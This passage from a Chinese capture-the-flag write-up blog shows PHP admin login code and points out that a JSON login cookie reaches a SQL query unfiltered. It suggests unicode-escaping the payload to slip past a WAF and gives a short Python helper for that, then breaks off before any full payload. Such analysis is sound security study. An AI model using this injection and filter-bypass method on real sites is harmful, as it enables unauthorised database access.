class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;../include/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">    <span class="variable">$safepassword</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;safepassword&#x27;</span>];</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;The administrator account or password is incorrect!&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>) != <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;The administrator account or password is incorrect!&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$user</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ispersis&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$login_data</span>[<span class="string">&#x27;admin_user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line">            <span class="variable">$login_data</span>[<span class="string">&#x27;admin_pass&#x27;</span>]=<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>) . LOGIN_KEY);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;1&quot;</span>,<span class="title function_ invoke__">time</span>() + <span class="number">604800</span> );</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>,<span class="title function_ invoke__">json_encode</span>(<span class="variable">$login_data</span>),<span class="title function_ invoke__">time</span>() + <span class="number">604800</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$realip</span> = <span class="title function_ invoke__">real_ip</span>();</span><br><span class="line">            <span class="variable">$address</span> = <span class="title function_ invoke__">getCity</span>(<span class="variable">$realip</span>);</span><br><span class="line">            <span class="variable">$ua</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">            <span class="variable">$device</span> = <span class="title function_ invoke__">get_device</span>(<span class="variable">$ua</span>);</span><br><span class="line">            <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES (&#x27;<span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$realip&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$address&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$device&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$time&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$login_data</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;login successful!&#x27;);window.location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$user</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_pass&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>) . LOGIN_KEY);</span><br><span class="line">            <span class="variable">$realip</span> = <span class="title function_ invoke__">real_ip</span>();</span><br><span class="line">            <span class="variable">$address</span> = <span class="title function_ invoke__">getCity</span>(<span class="variable">$realip</span>);</span><br><span class="line">            <span class="variable">$ua</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">            <span class="variable">$device</span> = <span class="title function_ invoke__">get_device</span>(<span class="variable">$ua</span>);</span><br><span class="line">            <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES (&#x27;<span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$realip&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$address&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$device&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$time&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;Login Successful!&#x27;);window.location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>]);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_pass&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;You have successfully logged out of this login!&#x27;);window.location.href=&#x27;./login.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$islogin</span> == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;You are already logged in!&#x27;);window.location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>貌似这里过滤的比较严，没什么可用的地方</p>
<p>那看一下member.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_CRONLITE&#x27;</span>)) <span class="keyword">exit</span>();</span><br><span class="line"><span class="variable">$islogin</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;islogin&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;login_data&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$login_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login_data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$admin_user</span> = <span class="variable">$login_data</span>[<span class="string">&#x27;admin_user&#x27;</span>];</span><br><span class="line">        <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$udata</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$login_data</span>[<span class="string">&#x27;admin_pass&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;admin_user&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$admin_user</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">        <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">        <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$_SESSION</span>[<span class="string">&quot;admin_pass&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话貌似有一个地方可以打，就是关于login_data键的值是没有任何过滤的，并且这里的话有json的解码，所以waf我们可以直接用unicode编码绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">string_to_unicode_escape</span>(text):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;将字符串转换为 `\uXXXX` 格式的字符串&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;unicode_escape&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;ascii&#x27;</span>)</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/" title="ctfshow之web专题">https://wanth3f1ag.top/2025/03/10/ctfshow之web专题/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/03/05/ctfshow%E6%91%86%E7%83%82%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="prev" title="ctfshow摆烂杯(已做完)">
                  <i class="fa fa-angle-left"></i> ctfshow摆烂杯(已做完)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/03/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%AF%E7%B4%AF/" rel="next" title="文件上传的一些积累">
                  文件上传的一些积累 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">50:05</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
